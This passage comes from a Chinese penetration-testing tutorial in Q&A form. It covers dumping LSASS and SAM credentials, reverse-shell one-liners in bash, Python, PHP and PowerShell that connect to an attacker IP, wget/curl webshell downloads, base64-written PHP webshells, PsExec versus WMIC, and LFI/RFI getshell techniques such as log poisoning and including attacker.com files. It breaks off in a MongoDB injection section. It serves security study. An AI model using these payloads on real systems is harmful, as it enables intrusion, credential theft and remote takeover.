<p><strong>第四步：凭据窃取与重用</strong></p>
<p>如果以上方法都失败了，或者你已经获得了管理员权限，下一步就是获取更多凭据，为横向移动做准备</p>
<p><strong>1. LSASS 进程内存转储</strong></p>
<p>Windows 在 <code>lsass.exe</code> 进程中缓存了用户的明文密码、NTLM 哈希和 Kerberos 票据</p>
<ul>
<li><strong>利用方式：</strong> 使用 <strong>Mimikatz</strong> 或其他工具，在拥有 <code>SeDebugPrivilege</code> 特权时，可以从 <code>lsass.exe</code> 进程中直接抓取凭据<ul>
<li><code>sekurlsa::logonpasswords</code>：抓取所有已登录用户的明文密码和哈希</li>
<li><code>lsass.exe</code> 内存转储：如果无法直接运行 Mimikatz，可以先使用 <code>procdump.exe</code> 转储 <code>lsass.exe</code> 进程内存，然后在另一台机器上离线分析</li>
</ul>
</li>
</ul>
<p><strong>2. SAM 和 SYSTEM 注册表文件</strong></p>
<p>SAM 文件包含了本地用户的密码哈希，而 SYSTEM 文件包含了用于解密 SAM 的密钥</p>
<ul>
<li><strong>利用方式：</strong> 使用 <code>reg save</code> 命令将这两个文件导出，然后使用工具（如 <code>samdump2</code> 或 <code>impacket</code> 的 <code>secretsdump.py</code>）离线解密哈希</li>
</ul>
<hr>
<h3 id="提权时选择可读写目录，为何尽量不用带空格的目录"><a href="#提权时选择可读写目录，为何尽量不用带空格的目录" class="headerlink" title="提权时选择可读写目录，为何尽量不用带空格的目录"></a>提权时选择可读写目录，为何尽量不用带空格的目录</h3><p><strong>1. 命令行解析问题</strong></p>
<p>在 Linux、Windows 等操作系统的命令行环境中，空格被视为命令、参数和选项的分隔符</p>
<p>例如，你想将一个文件写入 <code>/tmp/my file/</code> 目录：</p>
<ul>
<li><strong>错误的做法</strong>：<code>echo &quot;hello&quot; &gt; /tmp/my file/test.txt</code><ul>
<li>命令行会将其解释为：<ul>
<li><strong>命令</strong>：<code>echo &quot;hello&quot;</code></li>
<li><strong>参数</strong>：<code>&gt;</code></li>
<li><strong>参数</strong>：<code>/tmp/my</code></li>
<li><strong>参数</strong>：<code>file/test.txt</code></li>
</ul>
</li>
<li>显然，这会导致命令执行失败，因为 <code>/tmp/my</code> 目录不存在</li>
</ul>
</li>
<li><strong>正确的做法</strong>：为了让命令行将带空格的路径看作一个整体，需要用引号将路径包裹起来<ul>
<li><code>echo &quot;hello&quot; &gt; &quot;/tmp/my file/test.txt&quot;</code></li>
<li><code>echo &quot;hello&quot; &gt; /tmp/&quot;my file&quot;/test.txt</code></li>
<li><code>echo &quot;hello&quot; &gt; /tmp/my\ file/test.txt</code></li>
</ul>
</li>
</ul>
<p><strong>2. 脚本和编程语言的兼容性</strong></p>
<p>在进行提权时，我们通常不是手动输入命令，而是通过 Webshell 或漏洞执行脚本来完成操作。这些脚本（如 PHP、Python、Bash）在执行系统命令时，如果对带有空格的路径处理不当，就会导致提权失败</p>
<ul>
<li><strong>Bash 脚本</strong>：如果脚本中的变量没有用引号包裹，那么当变量值包含空格时，会引发解析错误<ul>
<li><strong>错误示例</strong>：<code>path=$webshell_path; cp /tmp/shell $path/shell.php</code></li>
<li><strong>正确示例</strong>：<code>path=&quot;$webshell_path&quot;; cp /tmp/shell &quot;$path/shell.php&quot;</code></li>
</ul>
</li>
<li><strong>PHP <code>system()</code> 或 <code>exec()</code> 函数</strong>：<ul>
<li><strong>错误示例</strong>：<code>system(&#39;cp /tmp/shell &#39; . $webshell_dir . &#39;/shell.php&#39;);</code><ul>
<li>如果 <code>$webshell_dir</code> 的值是 <code>/var/www/my site</code>，PHP 会执行 <code>cp /tmp/shell /var/www/my site/shell.php</code>，这会失败</li>
</ul>
</li>
<li><strong>正确示例</strong>：<code>system(&#39;cp /tmp/shell &quot;&#39; . $webshell_dir . &#39;/shell.php&quot;&#39;);</code><ul>
<li>加上双引号后，命令会正确执行</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>3. 避免不必要的复杂性</strong></p>
<p>在渗透测试的实战环境中，时间非常宝贵。为了快速、稳定地完成提权，我们会尽量选择最可靠的方法</p>
<ul>
<li><strong>绕过引号限制</strong>：在某些情况下，Webshell 或命令执行漏洞可能对引号（<code>&quot;</code> 或 <code>&#39;</code>）进行了过滤或转义，这会使得正确处理带有空格的路径变得更加困难</li>
<li><strong>减少出错概率</strong>：选择一个不带空格的目录，例如 <code>/tmp</code>、<code>/var/tmp</code>、<code>/dev/shm</code> 等，可以省去考虑引号包裹的麻烦，确保命令能够一次性成功执行，提高效率</li>
</ul>
<hr>
<h3 id="对于不能直接上传而只能通过命令行执行的-Shell-怎么办"><a href="#对于不能直接上传而只能通过命令行执行的-Shell-怎么办" class="headerlink" title="对于不能直接上传而只能通过命令行执行的 Shell 怎么办"></a>对于不能直接上传而只能通过命令行执行的 Shell 怎么办</h3><p><strong>1. 反弹 Shell</strong></p>
<p>这是最常用、最有效的方法。它的原理是让目标服务器主动连接到你的攻击机，而不是让你去连接它。这能绕过目标服务器的防火墙和出站连接限制，同时给你一个完整的交互式 shell</p>
<p><strong>基本步骤：</strong></p>
<ol>
<li><p><strong>在你的攻击机上设置监听</strong>： 你需要一个网络监听器来等待来自目标服务器的连接。常用的工具有 <code>netcat</code> (nc) 或 <code>socat</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 netcat 监听 4444 端口</span></span><br><span class="line">nc -lvnp 4444 </span><br></pre></td></tr></table></figure>

<p><code>l</code> 表示监听，<code>v</code> 表示显示详细信息，<code>n</code> 表示不进行DNS解析，<code>p</code> 表示指定端口</p>
</li>
<li><p><strong>在目标服务器上执行反弹 shell 命令</strong>： 根据目标服务器的操作系统和已有的工具，执行不同的命令</p>
<ul>
<li><p><strong>Bash</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/你的IP/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Python</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;你的IP&gt;&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>PHP</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;你的IP&gt;&quot;,4444);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>获取交互式 shell</strong>： 当目标服务器执行该命令后，它会连接到你的监听端口。你的 <code>netcat</code> 窗口会显示连接成功的消息，并且你将获得一个可执行命令的 shell</p>
</li>
</ol>
<p><strong>2. 通过 Web 请求传输文件</strong></p>
<p>如果目标服务器允许出站请求，并且你可以控制这些请求（比如通过 <code>curl</code> 或 <code>wget</code>），那么你可以让目标服务器从你的攻击机上下载文件</p>
<ol>
<li><p><strong>在你的攻击机上创建一个简单的 HTTP 服务器</strong>： 将你的 shell 文件（如一个 PHP Webshell）放在一个目录下，并用 Python 启动一个简单的 Web 服务器</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在你的 shell 文件所在目录下执行</span></span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在目标服务器上执行下载命令</strong>： 利用命令注入点，让目标服务器下载文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 wget</span></span><br><span class="line">wget http://你的IP/shell.php -O /var/www/html/shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者使用 curl</span></span><br><span class="line">curl http://你的IP/shell.php &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：你需要知道一个可写的、Web 服务器可以访问的目录（如 <code>/var/www/html/</code> 或 <code>/tmp/</code>）。如果 <code>/tmp</code> 目录可以写入，你可以先下载到 <code>/tmp</code>，再想办法移动到 Web 目录</p>
</li>
</ol>
<p><strong>3. 利用内置工具</strong></p>
<p>有些服务器环境自带一些可以创建 shell 的工具</p>
<ul>
<li><p><strong>VBScript &#x2F; PowerShell (Windows)</strong>： Windows 系统的 PowerShell 拥有强大的网络功能。你可以使用 PowerShell 来实现反弹 shell</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;&lt;你的IP&gt;&#x27;,4444);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0,<span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close();&quot;</span></span><br></pre></td></tr></table></figure>

<p>由于命令很长，你可以将其编码为 Base64 来避免空格和特殊字符的问题</p>
</li>
</ul>
<p><strong>4. 利用 <code>echo</code> 或其他写入命令</strong></p>
<p>如果目标服务器的出站连接被严格限制，你不能使用反弹 shell 或下载文件，但可以执行命令行。你可以通过 <code>echo</code> 命令，一行一行地将 shell 代码写入到一个文件中</p>
<p><strong>基本步骤：</strong></p>
<ol>
<li><p><strong>将你的 shell 代码进行编码</strong>： 为了避免引号和特殊字符问题，你可以将代码进行 Base64 编码。</p>
</li>
<li><p><strong>使用 <code>echo</code> 和 Base64 解码命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设你的 shell 代码经过 Base64 编码后为 &quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=&quot;</span> | <span class="built_in">base64</span> -d &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure>

<p>如果服务器不支持 <code>base64 -d</code>，你可能需要用其他方法，比如分多行写入，或者利用 <code>python -c &#39;print ...&#39;</code> 来写入文件</p>
<hr>
</li>
</ol>
<h3 id="psexec-和-wmic-区别"><a href="#psexec-和-wmic-区别" class="headerlink" title="psexec 和 wmic 区别"></a>psexec 和 wmic 区别</h3><p><strong>PsExec</strong></p>
<p><strong>PsExec</strong> 是 Sysinternals 套件中的一个工具，主要用于在远程计算机上 <strong>执行</strong> 进程。它通过 SMB 协议在远程系统上创建一个临时的服务（名为 <code>psexecsvc</code>）来运行你指定的命令，然后将命令的输出返回给你</p>
<p><strong>核心特点</strong></p>
<ul>
<li><strong>功能</strong>：在远程机器上以高权限（通常是 SYSTEM）执行命令或启动程序</li>
<li><strong>工作原理</strong>：<ol>
<li>连接到远程机器的 Admin$ 共享</li>
<li>将 PsExec 客户端文件复制到 <code>Admin$\System32\psexec.exe</code>（或类似路径）</li>
<li>通过服务管理器（SCM）创建一个临时服务来执行命令</li>
<li>命令执行完毕后，删除服务和客户端文件</li>
</ol>
</li>
<li><strong>典型用途</strong>：<ul>
<li>在远程服务器上启动交互式命令提示符 (<code>PsExec \\remote-pc cmd</code>)</li>
<li>以 SYSTEM 权限运行程序 (<code>PsExec -s \\remote-pc &lt;program.exe&gt;</code>)</li>
<li>执行远程脚本或批处理文件。</li>
</ul>
</li>
</ul>
<p><strong>优点与缺点</strong></p>
<ul>
<li><strong>优点</strong>：<ul>
<li><strong>远程执行能力强</strong>：能以高权限运行任何可执行文件或命令</li>
<li><strong>支持交互式会话</strong>：可以打开一个远程命令提示符，就像在本地操作一样</li>
<li><strong>不依赖</strong> PowerShell 或 WMI 的特定配置</li>
</ul>
</li>
<li><strong>缺点</strong>：<ul>
<li><strong>依赖文件共享</strong>：需要 Admin$ 共享可用，且端口 445 必须开放</li>
<li><strong>可能被安全软件检测</strong>：其工作方式（文件复制、创建服务）与一些恶意软件类似，可能被杀毒软件或 EDR 标记</li>
<li><strong>网络流量</strong>：在执行过程中会产生一些网络流量</li>
</ul>
</li>
</ul>
<p><strong>WMIC</strong></p>
<p><strong>WMIC</strong> (Windows Management Instrumentation Command-line) 是一个命令行工具，用于与 <strong>WMI</strong> 框架进行交互。WMI 是一个内置于 Windows 的管理接口，提供了查询和管理几乎所有系统信息的标准化方法。WMIC 让你能够从命令行执行这些查询和操作</p>
<p><strong>核心特点</strong></p>
<ul>
<li><strong>功能</strong>：查询系统信息、执行管理任务。它不是用于直接执行远程可执行文件，而是通过 WMI 接口来管理系统</li>
<li><strong>工作原理</strong>：<ol>
<li>通过 DCOM 协议连接到远程机器的 WMI 服务</li>
<li>向 WMI 存储库发送查询或命令请求</li>
<li>WMI 服务在远程机器上执行请求，并返回结果</li>
</ol>
</li>
<li><strong>典型用途</strong>：<ul>
<li>查询系统信息：例如，查看远程机器的进程列表 (<code>wmic /node:&quot;remote-pc&quot; process list brief</code>)、服务状态、硬件信息、网络配置等</li>
<li>执行管理任务：例如，终止远程进程 (<code>wmic /node:&quot;remote-pc&quot; process where name=&quot;calc.exe&quot; call terminate</code>)、启动或停止服务、修改注册表项等</li>
</ul>
</li>
</ul>
<p><strong>优点与缺点</strong></p>
<ul>
<li><strong>优点</strong>：<ul>
<li><strong>系统内置</strong>：是 Windows 的一部分，不需要额外下载或分发文件</li>
<li><strong>强大的查询能力</strong>：能够通过 <code>WHERE</code> 语句进行复杂的过滤，查询各种系统对象</li>
<li><strong>隐蔽性好</strong>：工作在 WMI 协议层，不会像 PsExec 那样创建临时服务或复制文件，因此更难被检测</li>
</ul>
</li>
<li><strong>缺点</strong>：<ul>
<li><strong>命令复杂</strong>：语法相对复杂，需要熟悉 WMI 的类和别名</li>
<li><strong>功能限制</strong>：虽然可以执行任务，但不能像 PsExec 那样灵活地运行任意的本地程序</li>
<li><strong>依赖</strong>：需要远程 WMI 服务开启且 DCOM 端口（通常是 135&#x2F;TCP）可用</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>特性</th>
<th>PsExec</th>
<th>WMIC</th>
</tr>
</thead>
<tbody><tr>
<td>用途</td>
<td>远程执行命令和程序</td>
<td>远程查询和管理系统信息</td>
</tr>
<tr>
<td>原理</td>
<td>远程创建服务，运行可执行文件</td>
<td>通过 WMI 接口发送管理命令</td>
</tr>
<tr>
<td>协议</td>
<td>SMB (TCP 445)</td>
<td>DCOM (TCP 135)</td>
</tr>
<tr>
<td>优势</td>
<td>远程执行能力强、支持交互式会话</td>
<td>系统内置、强大的查询过滤、隐蔽性好</td>
</tr>
<tr>
<td>缺点</td>
<td>需要文件共享、可能被检测、会产生文件</td>
<td>语法复杂、功能限于 WMI 框架内的操作</td>
</tr>
<tr>
<td>场景</td>
<td>当你需要在远程机器上启动一个程序时</td>
<td>当你需要查询远程机器的状态或执行管理任务时</td>
</tr>
</tbody></table>
<h1 id="17-文件包含漏洞"><a href="#17-文件包含漏洞" class="headerlink" title="17- 文件包含漏洞"></a>17- 文件包含漏洞</h1><h3 id="常用的协议有哪些"><a href="#常用的协议有哪些" class="headerlink" title="常用的协议有哪些"></a>常用的协议有哪些</h3><p><strong>本地文件包含（LFI）协议</strong></p>
<p>本地文件包含通常利用的是 Web 应用对用户输入的文件路径缺乏严格过滤，导致攻击者能够包含服务器上的任意文件</p>
<p><strong>1. <code>file://</code> 协议</strong></p>
<p>这是最基础、最常见的文件包含协议。它允许你直接引用本地文件系统中的文件</p>
<ul>
<li><strong>用途</strong>：读取服务器上的任意文件，如 <code>/etc/passwd</code>（Linux）或 <code>C:\Windows\win.ini</code>（Windows）</li>
<li><strong>示例</strong>：<code>http://example.com/vuln.php?file=file:///etc/passwd</code></li>
<li><strong>特点</strong>：如果 Web 应用没有对路径进行充分过滤，攻击者可以利用 <code>../</code> 来遍历目录，从而访问到 Web 根目录以外的敏感文件</li>
</ul>
<p><strong>远程文件包含（RFI）协议</strong></p>
<p>远程文件包含通常出现在 PHP 中，当 <code>allow_url_include</code> 和 <code>allow_url_fopen</code> 配置都开启时，Web 应用可以包含远程服务器上的文件</p>
<p><strong>1. <code>http://</code> 或 <code>https://</code> 协议</strong></p>
<p>这是最常见的远程文件包含方式，攻击者可以利用它来包含一个位于自己服务器上的恶意文件，从而在目标服务器上执行代码</p>
<ul>
<li><strong>用途</strong>：在 Web 服务器上执行远程主机上的脚本，通常用于获取Webshell</li>
<li><strong>示例</strong>：<code>http://example.com/vuln.php?file=http://attacker.com/shell.txt</code></li>
<li><strong>特点</strong>：<code>shell.txt</code>文件内容通常是一段Webshell代码，如<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></li>
</ul>
<p><strong>攻击者利用的伪协议（Pseudo Protocols）</strong></p>
<p>这些协议不是为了包含文件而设计的，但攻击者可以利用它们来读取文件内容、执行代码或绕过 WAF</p>
<p><strong>1. <code>php://filter</code></strong></p>
<p>这是一个非常强大的伪协议，它允许你对包含的文件内容进行过滤操作，比如编码或解码。最常见的用法是读取 PHP 文件的源码，因为源码中可能包含数据库凭证等敏感信息</p>
<ul>
<li><strong>用途</strong>：读取本地文件的源码，绕过 Web 应用对 <code>php</code> 文件执行的限制</li>
<li><strong>示例</strong>：<code>http://example.com/vuln.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></li>
<li><strong>特点</strong>：通过 Base64 编码，即使服务器对 <code>.php</code> 文件进行了执行处理，我们也能以明文形式获取其源码</li>
</ul>
<p><strong>2. <code>php://input</code></strong></p>
<p>这个协议可以让我们直接从 POST 请求的请求体中读取数据，并作为文件内容进行执行。当文件包含漏洞的参数无法直接在 URL 中写入恶意代码时，这是一个非常有用的绕过方法</p>
<ul>
<li><strong>用途</strong>：通过 POST 请求发送恶意代码并执行</li>
<li><strong>示例</strong>：在 POST 请求中，发送数据<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code>，同时访问<code>http://example.com/vuln.php?file=php://input</code></li>
<li><strong>特点</strong>：常用于绕过 WAF 对 URL 中特定字符串的检测</li>
</ul>
<p><strong>3. <code>data://</code></strong></p>
<p>这个协议可以让我们在 URL 中直接嵌入数据，并作为文件内容执行。这在某些情况下可以绕过一些过滤规则，因为它不依赖于外部文件</p>
<ul>
<li><strong>用途</strong>：在 URL 中直接执行恶意代码</li>
<li><strong>示例</strong>：<code>http://example.com/vuln.php?file=data://text/plain,&lt;?php%20system(&#39;id&#39;);%20?&gt;</code></li>
<li><strong>特点</strong>：如果 Web 应用对 URL 中的特殊字符进行过滤，这种方式可能会失效</li>
</ul>
<p><strong>4. <code>phar://</code></strong></p>
<p>这个协议常用于反序列化攻击，尤其是在 PHAR 归档文件中。攻击者可以创建一个恶意的 PHAR 文件，并在其中嵌入恶意代码或反序列化对象，当服务器通过文件包含加载这个文件时，就会触发反序列化操作</p>
<ul>
<li><strong>用途</strong>：利用 PHP 反序列化漏洞，执行任意命令</li>
<li><strong>示例</strong>：<code>http://example.com/vuln.php?file=phar:///path/to/archive.phar</code></li>
<li><strong>特点</strong>：这种攻击方式通常需要配合一个反序列化漏洞才能成功</li>
</ul>
<hr>
<h3 id="怎么-GetShell"><a href="#怎么-GetShell" class="headerlink" title="怎么 GetShell"></a>怎么 GetShell</h3><p><strong>本地文件包含 (LFI) Getshell</strong></p>
<p>LFI 的 Getshell 方法通常需要结合其他漏洞或技巧。攻击者无法直接包含一个远程 Webshell，但可以通过多种方式将恶意代码注入到服务器上的某个文件中，然后利用LFI漏洞包含该文件，从而执行恶意代码</p>
<p><strong>1. 日志文件 Getshell</strong></p>
<p>这是 LFI Getshell 最经典且常用的方法之一。许多 Web 服务器（如Apache、Nginx）会将访问请求记录在日志文件中（如<code>access.log</code> 或 <code>error.log</code>）</p>
<p><strong>利用步骤：</strong></p>
<ol>
<li><p><strong>注入恶意代码</strong>：通过一个特制的 HTTP 请求，将恶意代码（如 PHP Webshell 代码）注入到服务器的日志文件中。例如，在 URL 中加入或在 User-Agent 字段中写入 Webshell 代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一个完整的 HTTP 请求可能看起来像这样：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?page=test.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">User-Agent: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样，服务器的 <code>access.log</code> 文件中就会记录下这段恶意代码</p>
</li>
<li><p><strong>包含日志文件</strong>：利用 LFI 漏洞，通过文件包含参数（如 <code>page</code> 或 <code>file</code>），包含日志文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=../../../../var/log/apache2/access.log</span><br></pre></td></tr></table></figure>

<p>当服务器执行这个请求时，它会把日志文件的内容当作 PHP 代码来执行，从而执行了我们注入的<code>system(&#39;whoami&#39;);</code> 命令</p>
</li>
<li><p><strong>获取 Webshell</strong>：如果注入的是一个完整的 Webshell，现在就可以通过参数来执行任意命令了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=../../../../var/log/apache2/access.log&amp;cmd=ls -al</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>2. Session 文件 Getshell</strong></p>
<p>某些 Web 应用程序会将用户的 Session 信息保存在服务器的 <code>/tmp/</code> 目录下的文件中，文件命名通常为 <code>sess_PHPSESSID</code>。如果攻击者可以控制 Session 数据，就能通过 LFI 包含该文件 Getshell</p>
<p><strong>利用步骤：</strong></p>
<ol>
<li><p><strong>设置 Session 值</strong>：通过 <code>$_SESSION</code> 变量，将恶意代码注入到 Session 中。这通常需要先找到一个可以控制Session 值的参数，例如在登录或注册时</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>获取 Session 文件路径</strong>：通常 Session 文件的命名是 <code>sess_</code> 加上 Session ID。可以通过浏览器 Cookies 中的<code>PHPSESSID</code> 来获取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=../../../../tmp/sess_f32921a92a5436687e9544485304a9d7</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>执行恶意代码</strong>：当 LFI 漏洞包含该 Session 文件时，恶意代码被执行</p>
</li>
</ol>
<p><strong>3. &#x2F;proc&#x2F;self&#x2F;environ Getshell</strong></p>
<p>在 Linux 系统中，<code>/proc/self/environ</code> 文件存储了当前进程的环境变量。攻击者可以通过设置 User-Agent 等环境变量，将恶意代码注入到该文件中，然后利用 LFI 漏洞包含它</p>
<p><strong>利用步骤：</strong></p>
<ol>
<li><p><strong>设置 User-Agent</strong>：发送一个带有恶意 User-Agent 的请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?page=test.php HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">User-Agent: &lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>包含环境变量文件</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=../../../../proc/self/environ</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>执行恶意代码</strong>：成功包含后，恶意代码即被执行</p>
</li>
</ol>
<p><strong>远程文件包含 (RFI) Getshell</strong></p>
<p>RFI 通常比 LFI 更容易利用，因为它允许攻击者直接从自己的服务器上包含并执行恶意文件</p>
<p><strong>利用步骤：</strong></p>
<ol>
<li><p><strong>制作 Webshell 文件</strong>：在攻击者自己的服务器上创建一个 Webshell 文件，例如 <code>shell.txt</code>，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>为了绕过一些过滤，文件名可以不使用 <code>.php</code> 后缀，例如 <code>shell.txt</code> 或 <code>shell.jpg</code></p>
</li>
<li><p><strong>启动 HTTP 服务</strong>：在攻击者的服务器上（如Kali Linux），使用 Python 启动一个简单的 HTTP 服务来托管<code>shell.txt</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>远程文件包含</strong>：利用 RFI 漏洞，将 URL 指向攻击者的服务器，包含 <code>shell.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=http://attacker-ip/shell.txt</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：为了防止服务器对 URL 进行过滤，有时需要使用编码、伪协议（如 <code>data://</code>）等技巧</p>
</li>
<li><p><strong>连接 Webshell</strong>：如果成功，<code>shell.txt</code> 中的 Webshell 代码已经被执行。现在就可以使用工具（如 Postman、Burp Suite）或直接在 URL 中 POST 数据来执行命令了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?file=http://attacker-ip/shell.txt HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">cmd=ls -al</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="18-MongoDB注入"><a href="#18-MongoDB注入" class="headerlink" title="18- MongoDB注入"></a>18- MongoDB注入</h1><h3 id="MongoDB-注入方式"><a href="#MongoDB-注入方式" class="headerlink" title="MongoDB 注入方式"></a>MongoDB 注入方式</h3><p><strong>MongoDB 注入的原理</strong></p>
<p>MongoDB 注入的核心原理是<strong>利用MongoDB 查询中的特殊操作符或特性，来绕过应用程序的认证或执行未授权的数据库操作</strong>。当应用程序将用户输入直接拼接或用于构建查询对象时，攻击者可以通过构造恶意的输入来改变查询的逻辑</p>
<p>例如，一个典型的登录查询可能看起来像这样：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="property">collection</span>.<span class="title function_">findOne</span>(&#123;</span><br><span class="line">    <span class="attr">username</span>: request.<span class="property">body</span>.<span class="property">username</span>,</span><br><span class="line">    <span class="attr">password</span>: request.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>如果攻击者在<code>username</code>字段输入<code>&#123;&quot;$ne&quot;: null&#125;</code>，在<code>password</code>字段输入<code>&#123;&quot;$ne&quot;: null&#125;</code>，那么查询就会变成：</p>
